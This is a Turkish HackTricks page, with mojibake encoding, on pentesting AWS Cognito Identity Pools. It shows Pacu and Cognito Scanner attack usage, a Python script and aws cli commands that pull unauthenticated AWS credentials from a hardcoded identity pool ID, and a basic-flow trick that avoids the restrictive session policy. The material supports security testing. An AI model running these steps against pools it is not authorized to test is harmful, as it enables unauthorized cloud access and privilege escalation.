# Cognito Kimlik HavuzlarÄ±

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana dÃ¶nÃ¼ÅŸmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'Ä± **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## Temel Bilgiler

Kimlik havuzlarÄ±, kullanÄ±cÄ±larÄ±nÄ±zÄ±n **geÃ§ici kimlik bilgileri edinmesini** saÄŸlayarak Ã¶nemli bir rol oynar. Bu kimlik bilgileri, Amazon S3 ve DynamoDB gibi Ã§eÅŸitli AWS hizmetlerine eriÅŸmek iÃ§in gereklidir. Kimlik havuzlarÄ±nÄ±n dikkate deÄŸer bir Ã¶zelliÄŸi, hem anonim misafir kullanÄ±cÄ±larÄ± hem de kullanÄ±cÄ± kimlik doÄŸrulamasÄ± iÃ§in Ã§eÅŸitli kimlik saÄŸlayÄ±cÄ±larÄ±nÄ± desteklemesidir. Desteklenen kimlik saÄŸlayÄ±cÄ±larÄ± ÅŸunlarÄ± iÃ§erir:

- Amazon Cognito kullanÄ±cÄ± havuzlarÄ±
- Facebook, Google, Amazon ile GiriÅŸ Yap ve Apple ile Oturum AÃ§ gibi sosyal oturum aÃ§ma seÃ§enekleri
- OpenID Connect (OIDC) uyumlu saÄŸlayÄ±cÄ±lar
- SAML (Security Assertion Markup Language) kimlik saÄŸlayÄ±cÄ±larÄ±
- GeliÅŸtirici tarafÄ±ndan doÄŸrulanmÄ±ÅŸ kimlikler
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

Kimlik Havuzu oturumlarÄ±nÄ± oluÅŸturmak iÃ§in Ã¶ncelikle bir **Kimlik KimliÄŸi oluÅŸturmanÄ±z** gerekmektedir. Bu Kimlik KimliÄŸi, kullanÄ±cÄ±nÄ±n oturumunun **kimliklendirilmesi** iÃ§in kullanÄ±lÄ±r. Bu kimliklendirmeler, 1MB'ye kadar anahtar-deÄŸer Ã§iftlerini depolayabilen en fazla 20 veri kÃ¼mesine sahip olabilir.

Bu, bir kullanÄ±cÄ±nÄ±n bilgilerini (her zaman aynÄ± Kimlik KimliÄŸini kullanan kullanÄ±cÄ±) tutmak iÃ§in **faydalÄ±dÄ±r**.

AyrÄ±ca, hizmet olan **cognito-sync**, bu bilgileri (veri kÃ¼melerinde, akÄ±ÅŸlarda bilgi gÃ¶nderme ve SNS mesajlarÄ±nda) **yÃ¶netmeyi ve senkronize etmeyi** saÄŸlar.

### Pentesting iÃ§in AraÃ§lar

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), AWS saldÄ±rÄ± Ã§erÃ§evesi, artÄ±k bir hesaptaki tÃ¼m Cognito varlÄ±klarÄ±nÄ±n numaralandÄ±rÄ±lmasÄ±nÄ± otomatikleÅŸtiren "cognito\_\_enum" ve "cognito\_\_attack" modÃ¼llerini iÃ§ermektedir. ZayÄ±f yapÄ±landÄ±rmalarÄ±, eriÅŸim kontrolÃ¼ iÃ§in kullanÄ±lan kullanÄ±cÄ± Ã¶zniteliklerini vb. belirler ve ayrÄ±ca deÄŸiÅŸtirilebilir Ã¶zel Ã¶zniteliklere dayalÄ± kullanÄ±cÄ± oluÅŸturmayÄ± (MFA desteÄŸi de dahil) ve ayrÄ±calÄ±k yÃ¼kseltmeyi, kullanÄ±labilir kimlik havuzu kimlik bilgilerini, id belgelerindeki rol alÄ±nabilir rolleri otomatikleÅŸtirir.

ModÃ¼llerin iÅŸlevlerinin aÃ§Ä±klamasÄ± iÃ§in [blog yazÄ±sÄ±nÄ±n](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2) ikinci bÃ¶lÃ¼mÃ¼ne bakÄ±n. Kurulum talimatlarÄ± iÃ§in ana [Pacu](https://github.com/RhinoSecurityLabs/pacu) sayfasÄ±na bakÄ±n.

#### KullanÄ±m

Belirli bir kimlik havuzu ve kullanÄ±cÄ± havuzu istemcisi iÃ§in kullanÄ±cÄ± oluÅŸturma ve tÃ¼m ayrÄ±calÄ±k yÃ¼kseltme vektÃ¶rlerini denemek iÃ§in Ã¶rnek cognito\_\_attack kullanÄ±mÄ±:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Mevcut AWS hesabÄ±nda gÃ¶rÃ¼nen tÃ¼m kullanÄ±cÄ± havuzlarÄ±nÄ±, kullanÄ±cÄ± havuzu istemcilerini, kimlik havuzlarÄ±nÄ±, kullanÄ±cÄ±larÄ± vb. toplamak iÃ§in Ã¶rnek cognito\_\_enum kullanÄ±mÄ±:

```plaintext
cognito__enum
```

Bu komut, AWS hesabÄ±nda bulunan tÃ¼m kullanÄ±cÄ± havuzlarÄ±nÄ±, kullanÄ±cÄ± havuzu istemcilerini, kimlik havuzlarÄ±nÄ± ve kullanÄ±cÄ±larÄ± listeleyecektir.
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner), Cognito Ã¼zerinde istenmeyen hesap oluÅŸturma ve kimlik havuzu yÃ¼kseltme dahil olmak Ã¼zere farklÄ± saldÄ±rÄ±larÄ± uygulayan bir Python tabanlÄ± bir CLI aracÄ±dÄ±r.

#### Kurulum
```bash
$ pip install cognito-scanner
```
#### KullanÄ±m
```bash
$ cognito-scanner --help
```
Daha fazla bilgi iÃ§in https://github.com/padok-team/cognito-scanner adresini kontrol edin.

## IAM Rollerine EriÅŸim

### Kimlik DoÄŸrulamasÄ±z

Bir saldÄ±rganÄ±n, kimlik doÄŸrulamasÄ±z bir kullanÄ±cÄ± olarak bir Cognito uygulamasÄ±nda AWS kimlik bilgilerini elde etmek iÃ§in bilmesi gereken tek ÅŸey, Kimlik Havuzu KimliÄŸi'dir ve bu Kimlik Havuzu KimliÄŸi, web/mobil uygulamanÄ±n kullanmasÄ± iÃ§in kodlanmÄ±ÅŸ olmalÄ±dÄ±r. Bir Kimlik Havuzu KimliÄŸi ÅŸuna benzer: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (kaba kuvvet saldÄ±rÄ±sÄ± yapÄ±lamaz).

{% hint style="success" %}
IAM Cognito kimlik doÄŸrulamasÄ±z rolÃ¼ varsayÄ±lan olarak `Cognito_<Kimlik Havuzu adÄ±>Unauth_Role` olarak adlandÄ±rÄ±lÄ±r.
{% endhint %}

EÄŸer bir Kimlik Havuzu KimliÄŸi kodlanmÄ±ÅŸ olarak bulursanÄ±z ve kimlik doÄŸrulamasÄ±z kullanÄ±cÄ±lara izin veriyorsa, AWS kimlik bilgilerini aÅŸaÄŸÄ±daki komutla elde edebilirsiniz:
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
Ya da aÅŸaÄŸÄ±daki **aws cli komutlarÄ±nÄ±** kullanabilirsiniz:
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
UnutmayÄ±n ki varsayÄ±lan olarak kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ bir cognito kullanÄ±cÄ±sÄ±, bir politika aracÄ±lÄ±ÄŸÄ±yla atansa bile **herhangi bir izne sahip olamaz**. AÅŸaÄŸÄ±daki bÃ¶lÃ¼mÃ¼ kontrol edin.
{% endhint %}

### GeliÅŸmiÅŸ vs Temel Kimlik DoÄŸrulama AkÄ±ÅŸÄ±

Ã–nceki bÃ¶lÃ¼m, **varsayÄ±lan geliÅŸmiÅŸ kimlik doÄŸrulama akÄ±ÅŸÄ±nÄ±** takip etti. Bu akÄ±ÅŸ, oluÅŸturulan IAM rol oturumu iÃ§in **kÄ±sÄ±tlayÄ±cÄ±** bir [**oturum politikasÄ±**](../../aws-basic-information/#session-policies) ayarlar. Bu politika, oturuma [**bu listedeki hizmetleri kullanmasÄ±na izin verir**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) (rolÃ¼n diÄŸer hizmetlere eriÅŸimi olsa bile).

Ancak, **Kimlik havuzunda "Temel (Klasik) AkÄ±ÅŸ" etkinleÅŸtirilmiÅŸse**, kullanÄ±cÄ± bu akÄ±ÅŸÄ± kullanarak **kÄ±sÄ±tlayÄ±cÄ± oturum politikasÄ±na sahip olmayan** bir oturum elde edebilir.

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
Bu **hata**yÄ± alÄ±yorsanÄ±z, **temel akÄ±ÅŸ etkin deÄŸil (varsayÄ±lan)** olduÄŸu iÃ§in.

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

IAM kimlik bilgileri kÃ¼mesine sahip olduÄŸunuzda [hangi eriÅŸime sahip olduÄŸunuzu](../../#whoami) kontrol etmeli ve [ayrÄ±calÄ±klarÄ± yÃ¼kseltmeye](../../aws-privilege-escalation/) Ã§alÄ±ÅŸmalÄ±sÄ±nÄ±z.

### Kimlik doÄŸrulandÄ±

{% hint style="info" %}
**Kimlik doÄŸrulanan kullanÄ±cÄ±lar** muhtemelen **farklÄ± izinler** verilecektir, bu yÃ¼zden **uygulamaya kaydolabilirseniz**, bunu deneyin ve yeni kimlik bilgilerini alÄ±n.
{% endhint %}

AyrÄ±ca, Kimlik Havuzu'na eriÅŸen **kimlik doÄŸrulanan kullanÄ±cÄ±lar iÃ§in roller** de mevcut olabilir.

Bunun iÃ§in **kimlik saÄŸlayÄ±cÄ±ya** eriÅŸiminizin olmasÄ± gerekebilir. EÄŸer bu bir **Cognito KullanÄ±cÄ± Havuzu** ise, varsayÄ±lan davranÄ±ÅŸÄ± istismar edebilir ve **kendiniz yeni bir kullanÄ±cÄ± oluÅŸturabilirsiniz**.

{% hint style="success" %}
IAM Cognito kimlik doÄŸrulamasÄ± rolÃ¼ varsayÄ±lan olarak `Cognito_<Kimlik Havuzu adÄ±>Auth_Role` olarak adlandÄ±rÄ±lÄ±r.
{% endhint %}

Neyse ki, **aÅŸaÄŸÄ±daki Ã¶rnek**, Kimlik Havuzuna eriÅŸmek iÃ§in kullanÄ±lan bir **Cognito KullanÄ±cÄ± Havuzu** iÃ§inde zaten oturum aÃ§tÄ±ÄŸÄ±nÄ±zÄ± varsayar (unutmayÄ±n, diÄŸer kimlik saÄŸlayÄ±cÄ± tÃ¼rleri de yapÄ±landÄ±rÄ±lmÄ±ÅŸ olabilir).

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;kimlik_havuzu_id> \
--logins cognito-idp.&#x3C;bÃ¶lge>.amazonaws.com/&#x3C;SIZIN_KULLANICI_HAVUZU_IDNIZ>=&#x3C;ID_TOKEN>

# Ã–nceki komutun yanÄ±tÄ±ndan identity_id'yi alÄ±n
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;kimlik_id> \
--logins cognito-idp.&#x3C;bÃ¶lge>.amazonaws.com/&#x3C;SIZIN_KULLANICI_HAVUZU_IDNIZ>=&#x3C;ID_TOKEN>


# IdToken iÃ§inde, KullanÄ±cÄ± Havuzu GruplarÄ± nedeniyle bir kullanÄ±cÄ±nÄ±n eriÅŸimi olan rolleri bulabilirsiniz
# Belirli bir role kimlik bilgileri almak iÃ§in --custom-role-arn kullanÄ±n
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;kimlik_id> \
<strong>    --custom-role-arn &#x3C;rol_arn> \
</strong>    --logins cognito-idp.&#x3C;bÃ¶lge>.amazonaws.com/&#x3C;SIZIN_KULLANICI_HAVUZU_IDNIZ>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
KullanÄ±cÄ±nÄ±n oturum aÃ§tÄ±ÄŸÄ± **kimlik saÄŸlayÄ±cÄ±ya** baÄŸlÄ± olarak **farklÄ± IAM rolleri yapÄ±landÄ±rÄ±labilir** veya sadece **kullanÄ±cÄ±ya** baÄŸlÄ± olarak (talepleri kullanarak). Bu nedenle, aynÄ± veya farklÄ± saÄŸlayÄ±cÄ±lardan farklÄ± kullanÄ±cÄ±lara eriÅŸiminiz varsa, hepsinin IAM rollerine **giriÅŸ yapmak ve eriÅŸmek iÃ§in deÄŸer olabilir**.
{% endhint %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmaya kadar AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **tanÄ±tmak veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da** takip edin.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>
